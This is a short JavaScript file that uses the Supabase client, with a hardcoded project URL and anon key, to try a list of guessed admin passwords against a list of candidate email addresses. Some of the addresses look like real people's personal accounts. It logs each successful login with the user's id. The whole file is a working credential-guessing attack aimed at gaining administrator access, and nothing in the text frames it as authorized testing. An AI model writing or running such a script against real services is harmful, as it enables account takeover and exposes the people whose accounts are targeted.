const { createClient } = require('@supabase/supabase-js');

const s = createClient(
  'https://ktontqbfcinzqvalxyqd.supabase.co',
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt0b250cWJmY2luenF2YWx4eXFkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc2NTE0MzUsImV4cCI6MjA5MzIyNzQzNX0.XZPB5rzKKyHQW6HrKsiwFJoPJnQDEhqOT5jzYKEhQp8'
);

const candidates = [
  'ramu@gmail.com',
  'admin.gioe@feedx.com',
  'admin.gpw@feedx.com',
  'feedx.superadmin@feedx.app',
  'feedx_admin@feedx.app',
  'superadmin@feedx.app',
  'superadmin@feedx.com',
  'admin@feedx.app',
  'admin_global@feedx.app',
  'feedxhub@gmail.com',
  'admin1234@gmail.com',
  'bhanu000@gmail.com',
  'bhanuprasad092627@gmail.com'
];

const passwords = [
  'Admin@FeedX2026',
  'FeedX@123',
  'feedx@123',
  'SuperAdmin@123',
  'FeedX@2026',
  '123456',
  'FEEDX@2025'
];

async function scan() {
  console.log('Starting credentials scan...');
  for (const email of candidates) {
    for (const pwd of passwords) {
      try {
        const { data, error } = await s.auth.signInWithPassword({ email, password: pwd });
        if (!error && data?.user) {
          console.log(`>>> MATCH: ${email} | pwd: ${pwd} | id: ${data.user.id}`);
          break;
        }
      } catch (err) {
        // ignore
      }
    }
  }
  console.log('Scan complete.');
}

scan();
